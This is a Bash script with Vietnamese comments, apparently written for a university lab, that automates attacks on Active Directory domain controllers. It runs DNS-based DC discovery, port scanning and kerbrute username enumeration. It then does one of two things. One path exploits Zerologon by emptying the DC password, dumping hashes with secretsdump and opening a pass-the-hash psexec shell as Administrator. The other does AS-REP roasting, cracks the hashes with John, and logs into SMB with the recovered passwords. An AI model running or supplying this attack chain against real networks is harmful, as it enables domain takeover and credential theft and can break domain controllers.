#!/bin/bash

# ===================== CẤU HÌNH =====================
read -p "Nhập tên domain web (VD: web.tttn.ptit): " INPUT_DOMAIN

# Kiểm tra DNS trước
IP=$(dig +short "$INPUT_DOMAIN")
if [ -z "$IP" ]; then
    echo "[x] Domain không tồn tại hoặc không có bản ghi DNS!"
    exit 1
fi

# Kiểm tra HTTP response
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://$INPUT_DOMAIN)

if [[ "$HTTP_STATUS" =~ ^2|3 ]]; then
    echo "[✔] Domain $INPUT_DOMAIN tồn tại và phản hồi HTTP ($HTTP_STATUS)"
    WEB_DOMAIN="$INPUT_DOMAIN"
else
    echo "[x] Domain có DNS nhưng không phản hồi HTTP (mã: $HTTP_STATUS)."
    echo "    → Thử với HTTPS..."
    HTTPS_STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://$INPUT_DOMAIN)

    if [[ "$HTTPS_STATUS" =~ ^2|3 ]]; then
        echo "[✔] Domain $INPUT_DOMAIN phản hồi qua HTTPS ($HTTPS_STATUS)"
        WEB_DOMAIN="$INPUT_DOMAIN"
    else
        echo "[x] Domain không phản hồi HTTP/HTTPS. Không gán vào WEB_DOMAIN."
        exit 1
    fi
fi
WORDLIST="/usr/share/wordlists/rockyou.txt"
USERLIST="users.txt"
KERBRUTE="./kerbrute_linux_amd64"
GETNP="./GetNPUsers.py"
OUTPUT_DIR="./output"

mkdir -p "$OUTPUT_DIR"

# ====================== MENU ========================
echo ""
echo "========== MENU KHAI THÁC =========="
echo "1. Kiểm tra & khai thác lỗ hổng Zerologon (CVE-2020-1472)"
echo "2. Thực hiện AS-REP Roasting (GetNPUsers)"
echo "0. Thoát"
echo "===================================="
read -p "Chọn kỹ thuật khai thác (1/2/0): " CHOICE
echo ""

if [[ "$CHOICE" == "0" ]]; then
    echo "[!] Thoát script theo yêu cầu."
    exit 0
fi

echo "[*] B1: Tìm domain nội bộ qua SRV hoặc fallback sang SOA..."
SRV_RESULT=$(dig _ldap._tcp.dc._msdcs.$WEB_DOMAIN SRV +short)

if [ -n "$SRV_RESULT" ]; then
    DOMAIN=$(echo "$SRV_RESULT" | awk '{print $4}' | sed 's/\.$//')
    echo "[+] Domain từ SRV: $DOMAIN"
else
    echo "[!] Không có bản ghi SRV, thử lấy từ SOA..."
    DOMAIN=$(dig $WEB_DOMAIN SOA +noall +authority | awk '{print $1}' | sed 's/\.$//')
    echo "[+] Domain từ SOA: $DOMAIN"
fi

echo "[*] B2: Lấy IP từ tên Domain Controller ($DOMAIN)..."
DC_IP=$(dig $DOMAIN +short)
if [ -z "$DC_IP" ]; then
    echo "[!] Không lấy được IP từ $DOMAIN"
    exit 1
fi
echo "[+] IP DC: $DC_IP"

echo "[*] B3: Scan các cổng dịch vụ AD..."
nmap -Pn -p88,135,389,445,464 $DC_IP | tee "$OUTPUT_DIR/portscan.txt"

echo "[*] B4: Dùng crackmapexec SMB để xác định Domain NetBIOS, DC-Name..."
crackmapexec smb $DC_IP > "$OUTPUT_DIR/cme_output.txt"
cat "$OUTPUT_DIR/cme_output.txt" | grep -i "SMB" || echo "[!] Không thấy thông tin domain rõ ràng."

DC_NAME=$(grep -oP '\(name:\K[^)]+' "$OUTPUT_DIR/cme_output.txt" | head -n1)
if [ -z "$DC_NAME" ]; then
    DC_NAME=$(awk '/^SMB/ {print $4}' "$OUTPUT_DIR/cme_output.txt" | head -n1)
fi

DOMAIN_NETBIOS=$(grep -oP '\(domain:\K[^)]+' "$OUTPUT_DIR/cme_output.txt" | head -n1)
echo "DEBUG >> DC_NAME=$DC_NAME | DC_IP=$DC_IP"

echo "[*] B5: Dò username bằng kerbrute..."
$KERBRUTE userenum -d $DOMAIN $USERLIST --dc $DC_IP > "$OUTPUT_DIR/kerbrute_result.txt"
echo "[+] Danh sách user tồn tại (nếu có):"
grep "VALID USERNAME" "$OUTPUT_DIR/kerbrute_result.txt" || echo "[x] Không dò ra user nào hợp lệ."

# =================== B6: Zerologon ===================
if [[ "$CHOICE" == "1" ]]; then
    DC_NAME_UPPER=$(echo "$DC_NAME" | tr '[:lower:]' '[:upper:]')
    echo "[*] B6: Kiểm tra lỗ hổng Zerologon trên $DC_NAME_UPPER ($DC_IP)..."
    if [ -n "$DC_NAME" ] && [ -n "$DC_IP" ]; then
        ZEROCHECK=$(python3 zerologon_tester.py "$DC_NAME" "$DC_IP" 2>&1)
        echo "$ZEROCHECK" | tee "$OUTPUT_DIR/zerologon_check.txt"

        if echo "$ZEROCHECK" | grep -q "Success"; then
            echo "[✔] ✅ Máy DC $DC_NAME có lỗ hổng Zerologon! Tiến hành đặt mật khẩu trống..."
            python3 set_empty_pw.py "$DC_NAME" "$DC_IP"
            echo "[+] Đã thử đặt mật khẩu trống."

            echo "[*] Dump NTLM hash với impacket-secretsdump..."
            expect <<EOF > /dev/null
log_file "$OUTPUT_DIR/secretsdump_result.txt"
spawn impacket-secretsdump -just-dc "$DOMAIN/$DC_NAME\$@$DC_IP"
expect {
    "Password:" {
        send "\r"
        exp_continue
    }
    eof
}
EOF
            echo "[+] Hash đã lưu vào secretsdump_result.txt"

            echo "[*] B7: Tự động tìm hash Administrator và khai thác bằng impacket-psexec..."
            ADMIN_HASH_LINE=$(grep -i '^administrator:' "$OUTPUT_DIR/secretsdump_result.txt" | head -n1)
            if [ -n "$ADMIN_HASH_LINE" ]; then
                HASHES=$(echo "$ADMIN_HASH_LINE" | cut -d':' -f3,4)
                echo "[+] Hash Administrator: $HASHES"
                echo "[*] Khai thác shell với impacket-psexec..."
                impacket-psexec -hashes "$HASHES" Administrator@"$DC_IP"
            else
                echo "[x] Không tìm thấy hash của Administrator."
            fi
        else
            echo "[x] ❌ Không phát hiện Zerologon."
        fi
    else
        echo "[!] Thiếu thông tin DC_NAME hoặc DC_IP."
    fi
fi

# =================== B8 + B9: AS-REP ===================

if [[ "$CHOICE" == "2" ]]; then
    echo "[*] B8: AS-REP Roasting với GetNPUsers.py..."

    if [ -f "$GETNP" ]; then
        python3 "$GETNP" "$DOMAIN/" -no-pass -usersfile "$USERLIST" -dc-ip "$DC_IP" -request -format john > "$OUTPUT_DIR/asrep_hashes.txt"

        if [ -s "$OUTPUT_DIR/asrep_hashes.txt" ]; then
            echo "[+] Tìm thấy hash AS-REP! Crack với John the Ripper..."
            sudo john --format=krb5asrep --wordlist="$WORDLIST" "$OUTPUT_DIR/asrep_hashes.txt"

            echo "[*] Hiển thị kết quả crack và lưu vào cracked.txt..."
            sudo john --show --format=krb5asrep "$OUTPUT_DIR/asrep_hashes.txt" | tee "$OUTPUT_DIR/cracked.txt"

            if [ -s "$OUTPUT_DIR/cracked.txt" ]; then
                echo "[✔] Crack thành công. Kết quả lưu tại: cracked.txt"

                # =================== B9: Truy cập SMB với user đã crack ===================
                echo ""
                read -p "[*] B9: Nhập username bạn muốn dùng để kiểm tra SMB: " SELECTED_USER

                echo "[*] Đang tìm mật khẩu tương ứng trong cracked.txt..."
                USER_LINE=$(grep -i "\$$SELECTED_USER@" "$OUTPUT_DIR/cracked.txt")

                if [ -n "$USER_LINE" ]; then
                    PASSWORD=$(echo "$USER_LINE" | cut -d':' -f2)
                    echo "[+] Tìm thấy password: $PASSWORD"
                    echo "[*] Đang thử truy cập SMB với smbmap..."

                    smbmap -u "$SELECTED_USER" -p "$PASSWORD" -d "$DOMAIN_NETBIOS" -H "$DC_IP"

                    echo ""
                    read -p "[*] Bạn có muốn đăng nhập vào share SMB bằng smbclient? (y/n): " USE_SMBCLIENT
                    if [[ "$USE_SMBCLIENT" =~ ^[Yy]$ ]]; then
                        echo "[*] Đăng nhập SMB bằng smbclient..."
                        smbclient "//$DC_IP/hackme" -U "${DOMAIN_NETBIOS}\\$SELECTED_USER%$PASSWORD"
                    fi
                else
                    echo "[x] Không tìm thấy username '$SELECTED_USER' trong file cracked.txt."
                fi
            else
                echo "[x] Không crack được mật khẩu nào."
            fi
        else
            echo "[x] Không có AS-REP nào khả dụng (không có user có DONT_REQ_PREAUTH)."
        fi
    else
        echo "[x] Thiếu file GetNPUsers.py – bỏ qua bước AS-REP Roasting."
    fi
fi

